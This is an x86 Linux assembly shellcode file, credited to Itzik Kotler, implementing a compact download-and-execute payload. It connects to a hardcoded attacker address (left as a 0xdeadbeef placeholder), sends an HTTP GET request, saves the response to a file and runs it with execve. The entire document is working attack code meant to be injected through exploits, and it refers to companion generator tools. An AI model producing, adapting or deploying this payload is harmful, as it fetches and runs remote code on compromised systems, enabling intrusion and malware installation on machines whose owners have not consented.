#
# (x86/linux) HTTP/1.x GET, Downloads and execve() - 111+ bytes
#
# For further comments on the code and it's configuration values.
# Check out the .C version of this shellcode. Found at
#
# > http: // www.tty64.org/code/shellcodes/linux-x86/http-download-exec.c
#
# Also you can find gen_httpreq.c at
#
# > http: // www.tty64.org/code/shellcodes/utilities/gen_httpreq.c
#
# - Itzik Kotler <ik@ikotler.org>
#

.section .text
.global  _start

_start:

	push  $0x66
	popl  %eax
	cdq
	pushl $0x1
	popl  %ebx
	pushl %edx
	pushl %ebx
	pushl $0x2
	movl  %esp, %ecx
	int   $0x80

	popl %ebx
	popl %esi

	pushl $0xdeadbeef # replace with inet_addr() result

	movl  $0xaffffffd, %ebp # ~(0080|AF_INET)
	not   %ebp
	pushl %ebp

	incl  %ebx
	pushl $0x10
	pushl %ecx
	pushl %eax
	movb  $0x66, %al

	movl %esp, %ecx
	int  $0x80

	popl %edi

_open_file:

	movb  $0x8, %al
	pushl %edx
	pushl $0x41
	movl  %esp, %ebx
	pushl %eax
	popl  %ecx
	int   $0x80

	xchg %eax, %esi
	xchg %ebx, %edi

_gen_http_request:

#
# < use gen_httpreq.c, to generate a HTTP GET request. >
#

_gen_http_eof:

	movb $0x4, %al

_send_http_request:

	movl %esp, %ecx
	int  $0x80

	cdq
	incl %edx

_wait_for_dbl_crlf:

	decl %ecx
	movb $0x3, %al
	int  $0x80
	cmpl $0x0d0a0d0a, (%ecx)
	jne  _wait_for_dbl_crlf

_pre_dump_loop:

	movb $0x4, %dl

_dump_loop_do_read:

	movb $0x3, %al
	clc

_dump_loop_do_write:

	int  $0x80
	xchg %ebx, %esi
	jc   _dump_loop_do_read
	test %eax, %eax
	jz   _close_file
	movb $0x4, %al
	stc
	jmp  _dump_loop_do_write

_close_file:

	movb $0x6, %al
	int  $0x80

_execve_file:

	cdq
	movb  $0xb, %al
	movl  %edi, %ebx
	pushl %edx
	pushl %ebx
	jmp   _send_http_request
